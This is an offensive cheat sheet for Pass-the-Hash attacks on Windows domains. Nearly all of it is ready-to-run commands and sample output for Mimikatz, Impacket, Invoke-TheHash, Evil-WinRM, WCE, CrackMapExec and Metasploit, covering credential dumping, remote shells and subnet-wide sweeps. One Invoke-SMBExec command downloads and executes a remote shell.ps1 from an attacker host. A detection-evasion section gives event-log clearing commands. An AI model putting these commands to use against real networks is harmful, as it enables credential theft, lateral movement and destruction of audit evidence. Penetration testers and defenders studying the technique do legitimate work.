# Pass the Hash (PtH)



### Overview

**Pass-the-Hash (PTH)** is a technique where attackers use NTLM password hashes to authenticate to remote systems without knowing the plaintext password. Instead of cracking the hash, the hash itself is used directly for authentication. This works because NTLM authentication uses the hash, not the password, making it possible to impersonate users by injecting their hash into authentication processes.

**Key Concepts:**

* **NTLM Hash** - MD4 hash of user's password used for authentication
* **LM Hash** - Legacy hash format (weak, rarely used)
* **LSASS Injection** - Inserting hash into Local Security Authority Subsystem
* **Network Authentication** - Using hash for SMB, WMI, RDP, WinRM
* **Computer Accounts** - Can also be used for PTH attacks

**Attack Requirements:**

* NTLM hash of target user
* Network access to target system
* SMB, WMI, or other NTLM-based service available
* No requirement for plaintext password

**Common Use Cases:**

* Lateral movement within Active Directory
* Accessing file shares
* Remote command execution
* Privilege escalation
* Domain controller access

***

### Exploitation Workflow Summary

1. Hash Acquisition ├─ Dump NTLM hashes (Mimikatz, secretsdump) ├─ Extract from SAM/NTDS.dit ├─ Capture from network traffic └─ Obtain from credential dumps
2. Target Selection ├─ Identify systems where user has access ├─ Check for admin rights ├─ Map network shares └─ Enumerate services
3. Authentication ├─ Choose PTH tool (Mimikatz, Impacket, Evil-WinRM) ├─ Inject hash or pass to tool ├─ Authenticate to target └─ Verify access
4. Exploitation ├─ Execute commands ├─ Access file shares ├─ Install backdoors └─ Move laterally

***

### Mimikatz Pass-the-Hash

#### Basic PTH Attack

**Requires administrator privileges on source machine**

**PowerShell execution:**

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe"'
```

**Parameters:**

* `/user` - Username to impersonate
* `/domain` - Domain or computer name
* `/ntlm` - NTLM hash
* `/run` - Program to launch with injected credentials

**Expected result:**

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe
user    : administrator
domain  : corp.local
program : powershell.exe
impers. : no
NTLM    : 8846f7eaee8fb117ad06bdd830b7586c
  |  PID  4892
  |  TID  5044
  |  LSA Process is now R/W
  |  LUID 0 ; 2984103 (00000000:002d8927)
  \_ msv1_0   - data copy @ 00000000023E0490 : OK !
  \_ kerberos - data copy @ 00000000024A0C88
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 00000000024955E8 (32) -> null
```

**New PowerShell process opens with injected credentials:**

```powershell
# From the new PowerShell window
whoami
# Shows: corp\currentuser (local context)

# But network authentication uses administrator credentials
dir \\DC01\C$
# Works! Using administrator's hash
```

#### CMD Execution

**Direct command execution:**

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:admin /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe" exit
```

**Alternative syntax:**

```cmd
sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"cmd.exe"
```

**With LM hash (if needed):**

```cmd
sekurlsa::pth /user:admin /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /lm:aad3b435b51404eeaad3b435b51404ee /run:powershell.exe
```

***

### Impacket Pass-the-Hash (Linux)

#### PSExec

**Basic usage:**

```bash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
```

**With domain:**

```bash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/administrator@DC01.corp.local
```

**Expected output:**

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.1.10.....
[*] Found writable share ADMIN$
[*] Uploading file WFKqIiAB.exe
[*] Opening SVCManager on 192.168.1.10.....
[*] Creating service JKPn on 192.168.1.10.....
[*] Starting service JKPn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**Full hash format:**

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
```

#### WMIExec

**Execute commands via WMI:**

```bash
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
```

**With domain:**

```bash
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/administrator@DC01
```

**Expected output:**

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\> whoami
corp\administrator
```

#### SMBExec

**Alternative to PSExec:**

```bash
smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
```

**Advantages:**

* No file written to disk
* Uses Service Control Manager
* Stealthier than PSExec

#### ATExec

**Execute single command:**

```bash
atexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10 "whoami"
```

**Expected output:**

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating task \UzKAWSJI
[*] Running task \UzKAWSJI
[*] Deleting task \UzKAWSJI
[*] Attempting to read ADMIN$\Temp\UzKAWSJI.tmp
corp\administrator
```

**Multiple commands:**

```bash
atexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10 "powershell -c Get-Process"
```

#### SecretsDump

**Dump credentials from remote system:**

```bash
secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
```

**Expected output:**

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x12345678901234567890123456789012
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

***

### Impacket Windows Compiled Tools

**Download from GitHub releases**

**PSExec:**

```cmd
psexec_windows.exe -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10
```

**WMIExec:**

```cmd
wmiexec_windows.exe -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/administrator@DC01
```

**ATExec:**

```cmd
atexec_windows.exe -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10 "whoami"
```

**Note:** `cmd.exe` and `powershell.exe` won't provide interactive shell with atexec

***

### Invoke-TheHash (PowerShell)

#### Invoke-SMBExec

**Execute command on remote system:**

```powershell
Invoke-SMBExec -Target 192.168.1.10 -Domain corp.local -Username administrator -Hash 8846f7eaee8fb117ad06bdd830b7586c -Command 'powershell -ep bypass -c "iex(iwr http://192.168.1.5/shell.ps1 -UseBasicParsing)"' -Verbose
```

**Expected output:**

```
VERBOSE: [+] corp.local\administrator accessed WMI on 192.168.1.10
VERBOSE: Service BTOBTO created on 192.168.1.10
VERBOSE: Command executed with service BTOBTO on 192.168.1.10
VERBOSE: Service BTOBTO deleted on 192.168.1.10
```

#### Invoke-WMIExec

**WMI-based command execution:**

```powershell
Invoke-WMIExec -Target 192.168.1.10 -Domain corp.local -Username administrator -Hash 8846f7eaee8fb117ad06bdd830b7586c -Command "powershell -c Get-Process" -Verbose
```

**Multiple targets:**

```powershell
$targets = @("192.168.1.10", "192.168.1.11", "192.168.1.12")
foreach($target in $targets) {
    Invoke-WMIExec -Target $target -Domain corp.local -Username administrator -Hash 8846f7eaee8fb117ad06bdd830b7586c -Command "whoami"
}
```

#### Invoke-SMBClient

**Access file shares:**

```powershell
Invoke-SMBClient -Domain corp.local -Username administrator -Hash 8846f7eaee8fb117ad06bdd830b7586c -Source \\192.168.1.10\C$ -Verbose
```

**Recursive listing:**

```powershell
Invoke-SMBClient -Domain corp.local -Username administrator -Hash 8846f7eaee8fb117ad06bdd830b7586c -Action Recurse -Source \\192.168.1.10\C$\Users -Verbose
```

#### Invoke-SMBEnum

**Enumerate shares and permissions:**

```powershell
Invoke-SMBEnum -Domain corp.local -Username administrator -Hash 8846f7eaee8fb117ad06bdd830b7586c -Target 192.168.1.10 -Verbose
```

**Expected output:**

```
VERBOSE: [+] Enumerating shares on 192.168.1.10
VERBOSE: Share: ADMIN$
VERBOSE: Share: C$
VERBOSE: Share: IPC$
VERBOSE: Share: NETLOGON
VERBOSE: Share: SYSVOL
```

#### Invoke-TheHash

**All-in-one function with multiple targets:**

```powershell
Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -TargetExclude 192.168.1.50 -Username administrator -Hash 8846f7eaee8fb117ad06bdd830b7586c
```

**Parameters:**

* `-Type` - WMIExec, SMBExec, SMBClient, SMBEnum
* `-Target` - Single IP, range, or subnet
* `-TargetExclude` - IPs to skip
* `-Command` - Command to execute (optional)

**Check access without command:**

```powershell
Invoke-TheHash -Type SMBExec -Target 192.168.1.10-20 -Username administrator -Hash 8846f7eaee8fb117ad06bdd830b7586c
```

**Expected output:**

```
[+] corp.local\administrator accessed WMI on 192.168.1.10
[+] corp.local\administrator accessed WMI on 192.168.1.11
[-] corp.local\administrator failed to access 192.168.1.12
[+] corp.local\administrator accessed WMI on 192.168.1.15
```

***

### Evil-WinRM Pass-the-Hash

**Connect with hash:**

```bash
evil-winrm -i 192.168.1.10 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

**Expected output:**

```
Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\administrator\Documents> whoami
corp\administrator
```

**Upload file:**

```bash
*Evil-WinRM* PS C:\> upload /root/tools/mimikatz.exe C:\temp\mimikatz.exe
```

**Download file:**

```bash
*Evil-WinRM* PS C:\> download C:\temp\passwords.txt /root/loot/passwords.txt
```

**Execute commands:**

```bash
*Evil-WinRM* PS C:\> Get-Process
*Evil-WinRM* PS C:\> Invoke-Command -ScriptBlock {Get-Service}
```

***

### Windows Credentials Editor (WCE)

**Requires administrator privileges**

**Inject credentials into LSASS:**

```cmd
wce.exe -s administrator:corp.local:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**Format:**

```
username:domain:lm_hash:ntlm_hash
```

**After injection:**

```cmd
dir \\192.168.1.10\C$
# Works using injected credentials
```

**List cached credentials:**

```cmd
wce.exe -l
```

**Delete credentials:**

```cmd
wce.exe -d
```

***

### Computer Account PTH

**Computer accounts can also be used for PTH:**

**Extract computer account hash:**

```bash
secretsdump.py 'corp.local/administrator:password@DC01' -just-dc-user 'WORKSTATION01$'
```

**Expected output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
WORKSTATION01$:1104:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7890abcdef1234567890:::
```

**Use computer account hash:**

```bash
psexec.py -hashes :1a2b3c4d5e6f7890abcdef1234567890 'corp.local/WORKSTATION01$@DC01'
```

**Why this works:**

* Computer accounts have privileges on domain
* Can be used for DCSync attacks
* Useful for persistence

***

### Advanced Techniques

#### PTH with RDP

**Requires Restricted Admin mode enabled:**

**Enable Restricted Admin:**

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

**Connect with hash:**

```bash
xfreerdp /u:administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /v:192.168.1.10
```

#### PTH with CrackMapExec

**Check access across subnet:**

```bash
crackmapexec smb 192.168.1.0/24 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```

**Execute commands:**

```bash
crackmapexec smb 192.168.1.10 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"
```

**Dump SAM:**

```bash
crackmapexec smb 192.168.1.10 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c --sam
```

#### PTH with Metasploit

**PSExec module:**

```
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
exploit
```

***

### Detection Evasion

**Use computer accounts instead of user accounts**

**Rotate between different admin accounts**

**Avoid high-value targets (Domain Admins) when possible**

**Use Living off the Land techniques after initial access**

**Clean up artifacts:**

```cmd
# Clear event logs
wevtutil cl Security
wevtutil cl System

# Delete service artifacts
sc delete [service_name]
```

***

### Quick Reference

**Mimikatz:**

```cmd
sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:cmd.exe
```

**Impacket (Linux):**

```bash
psexec.py -hashes :HASH user@target
wmiexec.py -hashes :HASH user@target
smbexec.py -hashes :HASH user@target
```

**Evil-WinRM:**

```bash
evil-winrm -i target -u user -H HASH
```

**Invoke-TheHash:**

```powershell
Invoke-SMBExec -Target IP -Username user -Hash HASH -Command "cmd"
```

**CrackMapExec:**

```bash
crackmapexec smb target -u user -H HASH -x "whoami"
```

